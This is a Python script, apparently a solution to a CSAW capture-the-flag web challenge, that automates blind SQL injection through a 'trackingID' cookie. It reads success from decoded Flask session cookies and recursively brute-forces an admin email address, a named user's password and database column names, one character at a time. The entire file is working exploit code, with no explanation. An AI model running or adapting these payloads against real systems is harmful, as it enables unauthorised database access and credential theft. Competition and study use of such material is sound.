import grequests
import base64
import json
import zlib
from tqdm import trange, tqdm
import string
import time


def send_payload(payload):
    c = {}
    c["trackingID"] = payload
    r = grequests.get("http://web.csaw.io:5800/", cookies=c)
    return r


def recv_requests(reqs):
    rets = []
    for r in reqs:
        session = r.cookies["session"]
        # flask token
        if session.startswith("."):
            info = session.split(".")[1]
            info = base64.urlsafe_b64decode(info + "==")
            info = zlib.decompress(info)
        else:
            info = base64.urlsafe_b64decode(
                session.split(".")[0] + "==").decode()
        rets.append("Error" not in json.loads(info)["email"])
    return rets


alphabet = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$&'()*+,-./:;<=>?@[\]^`{|}~"""
# alphabet = """0123456789abcdefghijklmnopqrstuvwxyz!"#$&'()*+,-./:;<=>?@[\]^`{|}~"""


def recursor_email(known, i):
    time.sleep(0.5)
    reqs = []
    for c in tqdm(alphabet):
        payload = f"' UNION (SELECT 0,1 FROM users WHERE privilege LIKE BINARY 'admin' AND email LIKE BINARY '{known + c}%') -- x"
        reqs.append(send_payload(payload))

    reqs = grequests.map(reqs)
    data = recv_requests(reqs)
    rets = []
    if all(d == False for d in data):
        return [known]
    else:
        for j, d in enumerate(data):
            if d:
                print(alphabet[j])
                rets += recursor_email(known + alphabet[j], i+1)
        print(rets)
        return rets


def recursor_password(email, known, i):
    print(i, known)
    time.sleep(0.5)
    reqs = []
    for c in alphabet:
        payload = f"' UNION (SELECT 0,1 FROM users WHERE email LIKE BINARY '{email}' AND password LIKE BINARY '{known + c}%') -- x"
        reqs.append(send_payload(payload))

    reqs = grequests.map(reqs)
    data = recv_requests(reqs)
    rets = []
    if all(d == False for d in data):
        return [known]
    else:
        for j, d in enumerate(data):
            if d:
                # print(alphabet[j])
                rets += recursor_password(email, known + alphabet[j], i+1)
        # print(rets)
        return rets


def recursor_dbs(known, i):
    time.sleep(0.5)
    reqs = []
    for c in tqdm(alphabet):
        payload = f"' UNION (SELECT 1,column_name FROM information_schema.columns WHERE TABLE_NAME='trackingid' AND column_name LIKE BINARY '{known + c}%') -- x"
        reqs.append(send_payload(payload))

    reqs = grequests.map(reqs)
    data = recv_requests(reqs)
    rets = []
    if all(d == False for d in data):
        return [known]
    else:
        for j, d in enumerate(data):
            if d:
                print(alphabet[j])
                rets += recursor_dbs(known + alphabet[j], i+1)
        print(rets)
        return rets


# print(recursor_email("", 0))
email = 'emily.brown@mta.com'
print(recursor_password(email, "", 0))
